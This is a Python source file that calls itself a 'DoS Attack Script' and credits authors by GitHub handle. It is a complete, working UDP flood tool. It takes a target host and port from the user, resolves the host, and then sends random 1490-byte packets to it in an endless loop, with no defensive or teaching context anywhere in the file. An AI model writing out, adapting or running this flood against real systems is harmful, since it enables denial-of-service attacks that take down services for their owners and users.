import sys
import time
import socket
import os
import random
from datetime import datetime

now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("DoS Attack Script")
print("Original Author   : HA-MRX @ https://github.com/Ha3MrX")
print("Remaker           : Fimall @ https://github.com/ItsFimall")
print("Repo              : https://github.com/ItsFimall/DoS")


target = input("Target (IP or domain): ")
port_str = input("Port   : ")

# Check if either the IP or port is blank
if not target or not port_str:
    print("Both IP and port must be provided.")
    sys.exit()

try:
    port = int(port_str)
    if port < 1 or port > 65535:
        print("Port range error")
        sys.exit()
except ValueError:
    print("Invalid port number. Please enter a valid integer port.")
    sys.exit()

def resolve_target(target):
    try:
        ip = socket.gethostbyname(target)
        return ip
    except socket.gaierror:
        print(f"Could not resolve the domain: {target}")
        sys.exit()

ip = resolve_target(target)

os.system('cls' if os.name == 'nt' else 'clear')

sent = 0

while True:
    try:
        bytes = random._urandom(1490)  # Randomized Bytes
        _socket.sendto(bytes, (ip, port))  # Socket send packets
        sent = sent + 1
        print(f"Sent {sent} -> {ip}:{port}", end = "\r")
    except KeyboardInterrupt:
        print("User interrupted the attack.")
        sys.exit()
    except Exception as e:
        print(f"An error occurred: {e}")
